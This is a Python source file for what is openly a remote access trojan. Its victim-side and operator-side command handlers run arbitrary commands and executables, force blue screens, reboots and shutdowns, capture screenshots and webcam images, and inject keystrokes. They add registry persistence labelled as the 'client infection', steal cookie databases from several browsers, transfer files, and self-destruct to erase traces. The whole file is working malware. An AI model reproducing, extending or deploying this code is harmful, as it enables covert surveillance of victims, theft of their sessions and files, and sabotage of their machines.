from shared.extras.double_command import (
    DoubleCommandResult,
    add_double_command,
    CommandResult,
    DoubleCommand,
    ArgumentType,
    EmptyReturn,
)
import socket

from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from server_extras.client import Client


@add_double_command(
    "kill_proc",
    "kill_proc [ pid ]",
    "Kills a process on the client",
    [ArgumentType.integer],
    EmptyReturn,
)
class KillProcess(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import signal
        import os

        tmp_sock = sock.dup()
        tmp_sock.setblocking(True)
        tmp_sock.settimeout(5)
        try:
            pid = int.from_bytes(tmp_sock.recv(8))
        except OSError:
            return
        try:
            os.kill(pid, signal.SIGTERM)
            tmp_sock.sendall("Y".encode("ascii"))
        except PermissionError:
            try:
                tmp_sock.sendall("N".encode("ascii"))
            except OSError:
                return
        except OSError:
            try:
                tmp_sock.sendall("?".encode("ascii"))
            except OSError:
                return

    @staticmethod
    def server_side(client: "Client", params: tuple) -> CommandResult:
        tmp_sock = client.create_temp_socket(True, 5)
        try:
            tmp_sock.sendall(params[0].to_bytes(8))
        except TimeoutError:
            return CommandResult(DoubleCommandResult.timeout)
        except OSError:
            return CommandResult(DoubleCommandResult.conn_error)

        try:
            success_indicator = tmp_sock.recv(1).decode("ascii")
        except OSError:
            print(
                "Maybe killed process, client did not respond with a success indicator."
            )
            return CommandResult(DoubleCommandResult.semi_success)
        match success_indicator:
            case "N":
                print("Client could not kill process.")
                return CommandResult(DoubleCommandResult.failure)
            case "?":
                print(
                    "Client responded that the PID doesn't exist, or that it is invalid."
                )
                return CommandResult(DoubleCommandResult.failure)
            case "Y":
                print("Killed process.")
                return CommandResult(DoubleCommandResult.success)
            case _:
                print("Client returned unknown response.")
                return CommandResult(DoubleCommandResult.semi_success)


@add_double_command(
    "launch_exe",
    "launch_exe [ local exe path ]",
    "Launches an executable file on the client",
    [ArgumentType.string],
    int,
)
class LaunchExecutableFile(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import subprocess
        import random
        import os

        tmp_sock = sock.dup()
        tmp_sock.setblocking(True)
        tmp_sock.settimeout(5)
        exe_contents = bytearray()
        tmp_tries = 0
        while tmp_tries < 3:
            try:
                tmp_bytes = tmp_sock.recv(1024)
            except TimeoutError:
                break
            exe_contents += tmp_bytes
        if exe_contents == "EXIT".encode("ascii"):
            return
        exe_path = f"{os.getenv('TEMP')}/{''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890', k=5))}.exe"
        try:
            with open(exe_path, "wb") as tmp_exe_fd:
                tmp_exe_fd.write(exe_contents)
            proc = subprocess.Popen(
                exe_path, creationflags=subprocess.CREATE_NEW_CONSOLE
            )
            tmp_sock.sendall(str(proc.pid).encode("ascii"))
        except TimeoutError:
            return
        except OSError:
            try:
                tmp_sock.sendall(str(-1).encode("ascii"))
            except OSError:
                return

    @staticmethod
    def server_side(client: "Client", params: tuple) -> CommandResult:
        tmp_sock = client.create_temp_socket(True, 5)
        try:
            with open(params[0], "rb") as exe_fd:
                tmp_sock.sendall(exe_fd.read())
        except TimeoutError:
            print(f"Connection to client timeouted...")
            return CommandResult(DoubleCommandResult.timeout)
        except OSError:
            tmp_sock.send("EXIT".encode("ascii"))
            print(f"Error opening file '{params[0]}'.")
            return CommandResult(DoubleCommandResult.param_error)
        tmp_sock.settimeout(10)
        try:
            proc_pid = int(tmp_sock.recv(10).decode("ascii"))
        except (TypeError, ValueError, OSError):
            proc_pid = None

        if proc_pid == None:
            print("Maybe launched process, client did not respond with a PID.")
            return CommandResult(DoubleCommandResult.semi_success)
        elif proc_pid == -1:
            print("Could not start process.")
            return CommandResult(DoubleCommandResult.failure)

        print(f"Launched process with PID: {proc_pid}")
        return CommandResult(DoubleCommandResult.success, proc_pid)


@add_double_command(
    "invoke_bsod",
    "invoke_bsod",
    "Invokes a BSOD on the client",
    [],
    EmptyReturn,
)
class InvokeBSOD(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import shared.command_consts
        import subprocess

        tmp_sock = sock.dup()
        tmp_sock.setblocking(True)
        tmp_sock.settimeout(5)
        fail = False
        try:
            subprocess.Popen(shared.command_consts.EXECUTE_B64_BSOD)
        except OSError:
            fail = True
        try:
            if fail:
                tmp_sock.sendall("n".encode("ascii"))
            else:
                tmp_sock.sendall("y".encode("ascii"))
        except OSError:
            return

    @staticmethod
    def server_side(client: "Client", params: tuple) -> CommandResult:
        tmp_sock = client.create_temp_socket(True, 5)
        try:
            response = tmp_sock.recv(1).decode("ascii")
        except OSError:
            print(
                f"Possibly invoked BSOD, client did not respond with a success status."
            )
            return CommandResult(DoubleCommandResult.semi_success)
        match response:
            case "y":
                print(f"Invoked BSOD on client.")
                return CommandResult(DoubleCommandResult.success)
            case "n":
                print(f"Client could not execute script.")
                return CommandResult(DoubleCommandResult.failure)
            case _:
                print(f"Invalid success status from client.")
                return CommandResult(DoubleCommandResult.semi_success)


@add_double_command(
    "show_image",
    "show_image [ local image path ]",
    "Displays an image on the clients screen",
    [ArgumentType.string],
    EmptyReturn,
    required_client_modules=["Pillow"],
)
class ShowImage(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import threading
        import PIL.Image
        import io

        tmp_sock = sock.dup()
        tmp_sock.setblocking(True)
        tmp_sock.settimeout(5)

        try:
            tmp_buf = tmp_sock.recv(4096)
            img_contents = bytearray(tmp_buf)
        except OSError:
            return
        try:
            while len(tmp_buf) == 4096:
                tmp_buf = tmp_sock.recv(4096)
                img_contents += tmp_buf
        except OSError:
            pass

        try:
            if img_contents.decode("ascii") == "EXIT".encode("ascii"):
                return
        except UnicodeDecodeError:
            pass

        threading.Thread(
            target=lambda img_contents: PIL.Image.open(io.BytesIO(img_contents)).show(),
            name="show_img",
            args=(img_contents,),
        ).start()

    @staticmethod
    def server_side(client: "Client", params: tuple) -> CommandResult:
        tmp_sock = client.create_temp_socket(True, 5)

        try:
            with open(params[0], "rb") as img_file:
                img_contents = img_file.read()
        except OSError:
            print(f"Error reading file: '{params[0]}'")
            try:
                tmp_sock.sendall("EXIT".encode("ascii"))
            except OSError:
                pass
            return CommandResult(DoubleCommandResult.param_error)

        try:
            tmp_sock.sendall(img_contents)
        except OSError:
            return CommandResult(DoubleCommandResult.conn_error)

        print("Showed image on client.")
        return CommandResult(DoubleCommandResult.success)


@add_double_command(
    "screenshot",
    "screenshot",
    "Captures a screenshot on client",
    [],
    tuple[str, bytes],
    required_client_modules=["Pillow"],
)
class TakeScreenshot(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import PIL.ImageGrab
        import io

        tmp_sock = sock.dup()
        tmp_sock.setblocking(True)
        tmp_sock.settimeout(5)

        tmp_io = io.BytesIO()
        PIL.ImageGrab.grab().save(tmp_io, format="PNG")

        try:
            tmp_sock.sendall(tmp_io.getvalue())
        except OSError:
            pass

    @staticmethod
    def server_side(client: "Client", params: tuple) -> CommandResult:
        import random
        import os

        try:
            os.mkdir("screenshots")
        except FileExistsError:
            pass
        tmp_sock = client.create_temp_socket(True, 5)

        try:
            tmp_buf = tmp_sock.recv(4096)
            img_contents = bytearray(tmp_buf)
        except OSError:
            return CommandResult(DoubleCommandResult.conn_error)
        try:
            while len(tmp_buf) == 4096:
                tmp_buf = tmp_sock.recv(4096)
                img_contents += tmp_buf
        except OSError:
            pass

        tmp_name = ""
        try:
            with open(f"screenshots/{client.name}.png", "wb") as screenshot_file:
                screenshot_file.write(img_contents)
        except OSError:
            tmp_name = "".join(
                random.choices(
                    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890",
                    k=5,
                )
            )
            with open(f"screenshots/{tmp_name}.png", "wb") as screenshot_file:
                screenshot_file.write(img_contents)

        print(f"Captured screenshot: screenshots/{tmp_name or client.name}.png")
        return CommandResult(
            DoubleCommandResult.success,
            (f"screenshots/{tmp_name or client.name}.png", bytes(img_contents)),
        )


@add_double_command(
    "typewrite",
    "typewrite [ string to type ] { character delay }",
    "Types a string on the clients keyboard",
    [ArgumentType.string, ArgumentType.optional_float],
    EmptyReturn,
    required_client_modules=["pyautogui"],
)
class TypeWrite(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import pyautogui
        import threading
        import struct

        tmp_sock = sock.dup()
        tmp_sock.setblocking(True)
        tmp_sock.settimeout(5)

        try:
            interval = struct.unpack("d", tmp_sock.recv(8))[0]
            tmp_buf = tmp_sock.recv(1024)
            typewrite_str = bytearray(tmp_buf)
        except OSError:
            return

        try:
            while len(tmp_buf) == 1024:
                tmp_buf = tmp_sock.recv(1024)
                typewrite_str += tmp_buf
        except OSError:
            pass

        threading.Thread(
            target=lambda: pyautogui.typewrite(
                typewrite_str.decode("ascii", "ignore"), interval
            ),
            name="TypeWrite",
        ).start()

    @staticmethod
    def server_side(client: "Client", params: tuple) -> CommandResult:
        import struct

        tmp_sock = client.create_temp_socket(True, 5)

        corrected_params = params
        if len(params) == 1:
            corrected_params = (params[0], 0)

        try:
            tmp_sock.sendall(struct.pack("d", corrected_params[1]))
            tmp_sock.sendall(corrected_params[0].encode("ascii"))
        except OSError:
            return CommandResult(DoubleCommandResult.conn_error)

        print(
            f"Asked client to type {len(params[0])} characters with an interval {params[1]} seconds between each letter"
        )
        return CommandResult(DoubleCommandResult.success)


@add_double_command(
    "run_command",
    "run_command [ command ]",
    "Runs a command on the client",
    [ArgumentType.string],
    EmptyReturn,
)
class RunCommand(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import subprocess

        tmp_sock = sock.dup()
        tmp_sock.setblocking(True)
        tmp_sock.settimeout(5)

        try:
            tmp_buf = tmp_sock.recv(512)
            command = bytearray(tmp_buf)
        except OSError:
            return

        try:
            while len(tmp_buf) == 512:
                tmp_buf = tmp_sock.recv(512)
                command += tmp_buf
        except OSError:
            pass

        try:
            subprocess.Popen(command.decode("ascii"))
            tmp_sock.sendall("y".encode("ascii"))
        except OSError:
            try:
                tmp_sock.sendall("n".encode("ascii"))
            except OSError:
                pass
        except UnicodeDecodeError:
            try:
                tmp_sock.sendall("?".encode("ascii"))
            except OSError:
                pass

    @staticmethod
    def server_side(client: "Client", params: tuple) -> CommandResult:
        tmp_sock = client.create_temp_socket(True, 5)

        try:
            tmp_sock.sendall(params[0].encode("ascii"))
        except OSError:
            return CommandResult(DoubleCommandResult.conn_error)

        try:
            success_indicator = tmp_sock.recv(1).decode("ascii", "ignore")
        except (OSError, UnicodeDecodeError):
            print("Sent command, but client did not respond with a success status.")
            return CommandResult(DoubleCommandResult.semi_success)

        match success_indicator:
            case "y":
                print("Executed command on client.")
                return CommandResult(DoubleCommandResult.success)
            case "n":
                print("Client could not execute command.")
                return CommandResult(DoubleCommandResult.failure)
            case "?":
                print("Client didn't understand command.")
                return CommandResult(DoubleCommandResult.failure)
            case _:
                print(
                    "Sent command, but client did not respond with a valid success status."
                )
                return CommandResult(DoubleCommandResult.semi_success)


@add_double_command(
    "webcam_img",
    "webcam_img",
    "Captures an image from the clients webcam",
    [],
    tuple[str, bytes],
    required_client_modules=["opencv-python", "numpy"],
)
class CaptureWebcamImage(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import numpy
        import cv2

        tmp_sock = sock.dup()
        tmp_sock.setblocking(True)
        tmp_sock.settimeout(5)

        capture = cv2.VideoCapture(0)

        if not capture.isOpened():
            try:
                tmp_sock.sendall("n".encode("ascii"))
            except OSError:
                pass
            return

        success, frame = capture.read()

        if not success:
            try:
                tmp_sock.sendall("f".encode("ascii"))
            except OSError:
                pass
            return

        capture.release()

        try:
            image_bytes = numpy.array(cv2.imencode(".png", frame)[1]).tobytes()
        except Exception:
            try:
                tmp_sock.sendall("?".encode("ascii"))
            except OSError:
                pass
            return

        try:
            tmp_sock.sendall("y".encode("ascii"))
        except OSError:
            pass

        try:
            tmp_sock.sendall(image_bytes)
        except OSError:
            pass

    @staticmethod
    def server_side(client: "Client", params: tuple) -> CommandResult:
        import random
        import os

        try:
            os.mkdir("webcam_images")
        except FileExistsError:
            pass
        tmp_sock = client.create_temp_socket(True, 5)

        try:
            success_indicator = tmp_sock.recv(1).decode("ascii", "ignore")
        except OSError:
            print("Client failed to respond with a success indicator.")
            return CommandResult(DoubleCommandResult.conn_error)

        match success_indicator:
            case "y":
                pass
            case "n":
                print("Client could not open webcam (they are probably missing one)")
                return CommandResult(DoubleCommandResult.failure)
            case "f":
                print("Client could not capture image (webcam error)")
                return CommandResult(DoubleCommandResult.failure)
            case "?":
                print("Client encountered an error while decoding the image")
                return CommandResult(DoubleCommandResult.failure)
            case _:
                print("Client failed to respond with a valid success indicator.")
                return CommandResult(DoubleCommandResult.failure)

        try:
            tmp_buf = tmp_sock.recv(4096)
            img_contents = bytearray(tmp_buf)
        except OSError:
            return CommandResult(DoubleCommandResult.conn_error)

        try:
            while len(tmp_buf) == 4096:
                tmp_buf = tmp_sock.recv(4096)
                img_contents += tmp_buf
        except OSError:
            pass

        tmp_name = ""
        try:
            with open(f"webcam_images/{client.name}.png", "wb") as screenshot_file:
                screenshot_file.write(img_contents)
        except OSError:
            tmp_name = "".join(
                random.choices(
                    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890",
                    k=5,
                )
            )
            with open(f"webcam_images/{tmp_name}.png", "wb") as screenshot_file:
                screenshot_file.write(img_contents)

        print(f"Captured screenshot: webcam_images/{tmp_name or client.name}.png")
        return CommandResult(
            DoubleCommandResult.success,
            (f"webcam_images/{tmp_name or client.name}.png", bytes(img_contents)),
        )


@add_double_command(
    "add_persistence",
    "add_persistence",
    "Adds the client infection to PC startup",
    [],
    str,
)
class AddPersistence(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import urllib.request
        import subprocess
        import zipfile
        import winreg
        import shutil
        import os

        def bail(msg: str) -> None:
            try:
                tmp_sock.sendall(msg.encode("ascii"))
            except OSError:
                pass
            shutil.rmtree(folder_path, ignore_errors=True)

        tmp_sock = sock.dup()
        tmp_sock.setblocking(True)
        tmp_sock.settimeout(5)

        key_name = "C3Persistence"
        folder_name = key_name
        folder_path = f"{os.getenv('LOCALAPPDATA')}/{folder_name}"

        runtime_path = f"{folder_path}/runtime"
        runtime_zip_path = f"{runtime_path}/python-3.12.1-embed-amd64.zip"
        os.mkdir(folder_path)
        os.mkdir(runtime_path)

        try:
            urllib.request.urlretrieve(
                "https://www.python.org/ftp/python/3.12.1/python-3.12.1-embed-amd64.zip",
                runtime_zip_path,
            )
            with zipfile.ZipFile(runtime_zip_path, "r") as zip_file:
                zip_file.extractall(runtime_path)
            os.remove(runtime_zip_path)
        except Exception:
            bail("GETPY_ERR")
            return

        try:
            urllib.request.urlretrieve(
                "https://bootstrap.pypa.io/get-pip.py", f"{runtime_path}/get-pip.py"
            )
            get_pip_runner = subprocess.Popen(
                f"{runtime_path}/python.exe {runtime_path}/get-pip.py",
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            get_pip_runner.wait()
            os.remove(f"{runtime_path}/get-pip.py")
        except OSError:
            bail("GETPIP_ERR")
            return

        shutil.copytree("./client_extras", f"{folder_path}/client_extras")
        shutil.copytree("./server_extras", f"{folder_path}/server_extras")
        shutil.copytree("./shared", f"{folder_path}/shared")
        # .pyw files do not show a console window
        shutil.copy("./server.py", f"{folder_path}/server.pyw")
        shutil.copy("./client.py", f"{folder_path}/client.pyw")

        try:
            with winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                0,
                winreg.KEY_SET_VALUE,
            ) as startup_key:
                winreg.SetValueEx(
                    startup_key,
                    key_name,
                    0,
                    winreg.REG_SZ,
                    f"{runtime_path}/pythonw.exe {folder_path}/client.pyw",
                )
        except OSError:
            bail("REG_ERR")
            return
        try:
            tmp_sock.sendall(folder_path.encode("ascii"))
        except OSError:
            pass

    @staticmethod
    def server_side(client: "Client", params: tuple) -> CommandResult:
        tmp_sock = client.create_temp_socket(True, 60)

        try:
            install_path = (
                tmp_sock.recv(128).decode("ascii", "ignore").replace("/", "\\")
            )
        except OSError:
            print("Client did not respond with a success indicator.")
            return CommandResult(DoubleCommandResult.conn_error)

        match install_path:
            case "REG_ERR":
                print("Client encountered registry error.")
                return CommandResult(DoubleCommandResult.failure)
            case "GETPY_ERR":
                print("Client failed to download the portable python environment.")
                return CommandResult(DoubleCommandResult.failure)
            case "GETPIP_ERR":
                print("Client failed to download pip (Pythons Intergalactic Penis).")
                return CommandResult(DoubleCommandResult.failure)
            case _:
                print(f"Client installed persistence to '{install_path}'")
                return CommandResult(DoubleCommandResult.success, install_path)


@add_double_command(
    "reboot",
    "reboot { delay seconds }",
    "Reboots the client PC",
    [ArgumentType.optional_float],
    EmptyReturn,
)
class Reboot(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import subprocess
        import threading
        import time

        def delayed_reboot(delay_in_ms: int) -> None:
            time.sleep(delay_in_ms / 1000)
            subprocess.Popen(["shutdown", "/f", "/r", "/t", "0"])

        tmp_sock = sock.dup()
        tmp_sock.setblocking(True)
        tmp_sock.settimeout(5)

        try:
            threading.Thread(
                target=delayed_reboot,
                name="Delayed Reboot",
                args=[int.from_bytes(tmp_sock.recv(8))],
            ).start()
        except OSError:
            pass

    @staticmethod
    def server_side(client: "Client", params: tuple) -> CommandResult:
        tmp_sock = client.create_temp_socket(True, 5)

        if len(params) == 0:
            params = (0,)

        try:
            tmp_sock.sendall(round(params[0] * 1000).to_bytes(8))
        except OSError:
            print(f"Failed to send delay time to client.")
            return CommandResult(DoubleCommandResult.conn_error)

        if params[0] == 0:
            print(f"Asked client to reboot immediately.")
        else:
            print(f"Asked client to reboot in {params[0]} seconds.")
        return CommandResult(DoubleCommandResult.success)


@add_double_command(
    "shutdown",
    "shutdown { delay seconds }",
    "Turns off the client PC",
    [ArgumentType.optional_float],
    EmptyReturn,
)
class Shutdown(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import subprocess
        import threading
        import time

        def delayed_shutdown(delay_in_ms: int) -> None:
            time.sleep(delay_in_ms * 1000)
            subprocess.Popen(["shutdown", "/f", "/s", "/t", "0"])

        tmp_sock = sock.dup()
        tmp_sock.setblocking(True)
        tmp_sock.settimeout(5)

        try:
            threading.Thread(
                target=delayed_shutdown,
                name="Delayed Shutdown",
                args=[int.from_bytes(tmp_sock.recv(8))],
            ).start()
        except OSError:
            pass

    @staticmethod
    def server_side(client: "Client", params: tuple) -> CommandResult:
        tmp_sock = client.create_temp_socket(True, 5)

        if len(params) == 0:
            params = (0,)

        try:
            tmp_sock.sendall(round(params[0] * 1000).to_bytes(8))
        except OSError:
            print(f"Failed to send delay time to client.")
            return CommandResult(DoubleCommandResult.conn_error)

        if params[0] == 0:
            print(f"Asked client to shut down immediately.")
        else:
            print(f"Asked client to shut down in {params[0]} seconds.")
        return CommandResult(DoubleCommandResult.success)


@add_double_command(
    "self_destruct",
    "self_destruct",
    "Self destructs and removes all trace of infection on the client side",
    [],
    EmptyReturn,
)
class SelfDestruct(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        from shared.command_consts import SELF_DESTRUCT_TEMPLATE
        import subprocess
        import winreg
        import sys
        import os

        try:
            with winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                access=winreg.KEY_READ | winreg.KEY_WRITE,
            ) as startup_entries_key:
                num_entries = winreg.QueryInfoKey(startup_entries_key)[1]

                for entry_index in range(num_entries):
                    key_name, *_ = winreg.EnumValue(startup_entries_key, entry_index)
                    if key_name == "C3Persistence":
                        winreg.DeleteKey(
                            startup_entries_key,
                            key_name,
                        )
        except Exception:
            pass

        parent_dir = "/".join(os.path.split(__file__)[0].split("\\")[:-1])
        with open(f"{parent_dir}/self_destruct.bat", "w") as tmp_self_destruct_launcher:
            tmp_self_destruct_launcher.write(
                SELF_DESTRUCT_TEMPLATE.format(pdir=parent_dir)
            )
        subprocess.Popen(
            f"cmd /c {parent_dir}/self_destruct.bat && del /f {parent_dir}/self_destruct.bat && exit"
        )

        sys.exit()

    @staticmethod
    def server_side(client: "Client", params: tuple) -> CommandResult:
        print("Killed and asked client to self destruct.")
        client.kill()
        return CommandResult(DoubleCommandResult.success)


@add_double_command(
    "steal_cookies",
    "steal_cookies",
    "Downloads cookies from the client",
    [],
    str,
)
class CookieStealer(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import os

        tmp_sock = sock.dup()
        tmp_sock.setblocking(True)
        tmp_sock.settimeout(5)

        LOCAL = os.getenv("LOCALAPPDATA")
        if LOCAL == None:
            return

        paths: dict[str, str] = {}
        if len(LOCAL) > 0:
            paths["chrome"] = f"{LOCAL}/Google/Chrome/User Data/Default/Network/Cookies"
            paths[
                "yandex"
            ] = f"{LOCAL}/Yandex/YandexBrowser/User Data/Network/Default/Cookies"
            paths[
                "brave"
            ] = f"{LOCAL}/BraveSoftware/Brave-Browser/User Data/Default/Network/Cookies"
            paths["edge"] = f"{LOCAL}/Microsoft/Edge/User Data/Default/Network/Cookies"
            paths["vivaldi"] = f"{LOCAL}/Vivaldi/User Data/Default/Network/Cookies"
            paths["chromium"] = f"{LOCAL}/Chromium/User Data/Default/Network/Cookies"
            paths["torch"] = f"{LOCAL}/Torch/User Data/Default/Network/Cookies"

        for browser_name, path in paths.items():
            try:
                with open(path, "rb") as cookies_file:
                    cookies_sql = cookies_file.read()
                    tmp_sock.sendall(len(browser_name).to_bytes(8))
                    tmp_sock.sendall(len(cookies_sql).to_bytes(8))
                    tmp_sock.sendall(browser_name.encode("ascii"))
                    tmp_sock.sendall(cookies_sql)
            except OSError:
                continue

    @staticmethod
    def server_side(client: "Client", params: tuple) -> CommandResult:
        import random
        import os

        try:
            os.mkdir("cookies")
        except FileExistsError:
            pass
        try:
            target_folder = f"cookies/{client.name}"
            os.mkdir(target_folder)
        except OSError:
            tmpname = "".join(
                random.choices("abcdefghijklmnopqrstuvwxyz1234567890", k=6)
            )
            target_folder = f"cookies/{tmpname}"
            os.mkdir(target_folder)

        tmp_sock = client.create_temp_socket(True, 5)

        is_first_run = True
        while True:
            try:
                lengths = tmp_sock.recv(16)
                name_length = int.from_bytes(lengths[:8])
                db_length = int.from_bytes(lengths[8:])
                filename = (
                    tmp_sock.recv(name_length)
                    .decode("ascii", "ignore")
                    .translate(str.maketrans({char: "" for char in '\\/*?<>:|"'}))
                )
                cookies_db = tmp_sock.recv(db_length)
                try:
                    with open(f"{target_folder}/{filename}.db", "wb") as cookies_db_fd:
                        cookies_db_fd.write(cookies_db)
                except OSError:
                    pass
                is_first_run = False
            except OSError:
                if is_first_run:
                    print("Client failed to send cookies.")
                    return CommandResult(DoubleCommandResult.conn_error)
                break

        print(
            f"Downloaded {len(os.listdir(target_folder))} cookie databases to {target_folder}"
        )
        return CommandResult(DoubleCommandResult.success, target_folder)


@add_double_command(
    "upload_file",
    "upload_file [ local path ] [ client side path ]",
    "Uploads a file to the client",
    [ArgumentType.string, ArgumentType.string],
    EmptyReturn,
)
class UploadFile(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        tmp_sock = sock.dup()
        tmp_sock.setblocking(True)
        tmp_sock.settimeout(5)

        try:
            destination = tmp_sock.recv(int.from_bytes(tmp_sock.recv(8)))
            file_contents = tmp_sock.recv(int.from_bytes(tmp_sock.recv(8)))
        except OSError:
            return

        response = "y"
        try:
            with open(destination, "wb") as dest_file:
                dest_file.write(file_contents)
        except PermissionError:
            response = "p"
        except OSError:
            response = "?"

        try:
            tmp_sock.sendall(response.encode("ascii"))
        except OSError:
            return

    @staticmethod
    def server_side(client: "Client", params: tuple) -> CommandResult:
        import os

        tmp_sock = client.create_temp_socket(True, 5)

        if not os.path.isfile(params[0]):
            print(f"File '{params[0]} not found")
            return CommandResult(DoubleCommandResult.param_error)

        with open(params[0], "rb") as file_to_send:
            try:
                file_contents = file_to_send.read()
                tmp_sock.sendall(len(params[1]).to_bytes(8))
                tmp_sock.sendall(params[1].encode("ascii"))
                tmp_sock.sendall(len(file_contents).to_bytes(8))
                tmp_sock.sendall(file_contents)
            except OSError:
                print("Connection error whilst trying to send file")
                return CommandResult(DoubleCommandResult.conn_error)

        try:
            success_indicator = tmp_sock.recv(1).decode("ascii")
        except OSError:
            print("Sent file but client did not respond with a success indicator")
            return CommandResult(DoubleCommandResult.semi_success)

        match success_indicator:
            case "y":
                print("Sent file successfully")
                return CommandResult(DoubleCommandResult.success)
            case "p":
                print(
                    f"Client does not have permission to write the given file {params[1]}"
                )
                return CommandResult(DoubleCommandResult.failure)
            case "?":
                print(
                    f"Client says that the given destination file path ({params[1]}) is invalid"
                )
                return CommandResult(DoubleCommandResult.failure)
            case _:
                print(
                    "Sent file but client did not respond with an invalid success indicator"
                )
                return CommandResult(DoubleCommandResult.semi_success)


@add_double_command(
    "download_file",
    "download_file [ client side path ] [ local path ]",
    "Downloads a file from the client",
    [ArgumentType.string, ArgumentType.string],
    EmptyReturn,
    max_selected=1,
)
class DownloadFile(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        tmp_sock = sock.dup()
        tmp_sock.setblocking(True)
        tmp_sock.settimeout(5)

        try:
            source = tmp_sock.recv(int.from_bytes(tmp_sock.recv(8)))
        except OSError:
            return

        response = "y"
        try:
            with open(source, "rb") as src_file:
                file_contents = src_file.read()
        except PermissionError:
            response = "p"
        except FileNotFoundError:
            response = "n"
        except OSError:
            response = "?"

        try:
            tmp_sock.sendall(response.encode("ascii"))
        except OSError:
            pass

        if response != "y":
            return
        try:
            tmp_sock.sendall(len(file_contents).to_bytes(8))  # type: ignore
            tmp_sock.sendall(file_contents)  # type: ignore
        except OSError:
            return

    @staticmethod
    def server_side(client: "Client", params: tuple) -> CommandResult:
        tmp_sock = client.create_temp_socket(True, 5)

        try:
            tmp_sock.sendall(len(params[0]).to_bytes(8))
            tmp_sock.sendall(params[0].encode("ascii"))
        except OSError:
            print("Connection error whilst trying to send source file path")
            return CommandResult(DoubleCommandResult.conn_error)

        try:
            success_indicator = tmp_sock.recv(1).decode("ascii")
        except OSError:
            print("Asked for file but client did not respond with a success indicator")
            return CommandResult(DoubleCommandResult.semi_success)

        match success_indicator:
            case "y":
                try:
                    file_contents = tmp_sock.recv(int.from_bytes(tmp_sock.recv(8)))
                except OSError:
                    print("Connection error whilst trying to recieve file contents")
                    return CommandResult(DoubleCommandResult.conn_error)
                except MemoryError:
                    print("Client sent invalid information")
                    return CommandResult(DoubleCommandResult.failure)
                try:
                    with open(params[1], "wb") as dest_file:
                        dest_file.write(file_contents)
                except OSError:
                    print(f"Failure when writing to '{params[1]}")
                    return CommandResult(DoubleCommandResult.failure)
                print("Recieved and wrote file successfully")
                return CommandResult(DoubleCommandResult.success)
            case "p":
                print(
                    f"Client does not have permission to read the given file ('{params[0]}')"
                )
                return CommandResult(DoubleCommandResult.failure)
            case "?":
                print(
                    f"Client says that the given source file path ('{params[0]}') is invalid"
                )
                return CommandResult(DoubleCommandResult.failure)
            case "n":
                print(f"Client says that the given file ('{params[0]}') doesn't exist")
                return CommandResult(DoubleCommandResult.failure)
            case _:
                print(
                    "Recieved and wrote file but client did not respond with an invalid success indicator"
                )
                return CommandResult(DoubleCommandResult.failure)


@add_double_command(
    "open_url",
    "open_url [ url ]",
    "Opens a URL in a new webbrowser on the client",
    [ArgumentType.string],
    EmptyReturn,
)
class OpenURL(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import webbrowser

        tmp_sock = sock.dup()
        tmp_sock.setblocking(True)
        tmp_sock.settimeout(5)

        try:
            webbrowser.open(
                tmp_sock.recv(int.from_bytes(tmp_sock.recv(8))).decode("ascii")
            )
        except OSError:
            return

    @staticmethod
    def server_side(client: "Client", params: tuple) -> CommandResult:
        tmp_sock = client.create_temp_socket(True, 5)

        try:
            tmp_sock.sendall(len(params[0]).to_bytes(8))
            tmp_sock.sendall(params[0].encode("ascii"))
        except OSError:
            print("Connection error whilst sending url to client")
            return CommandResult(DoubleCommandResult.failure)

        print("Opened url on client")
        return CommandResult(DoubleCommandResult.success)
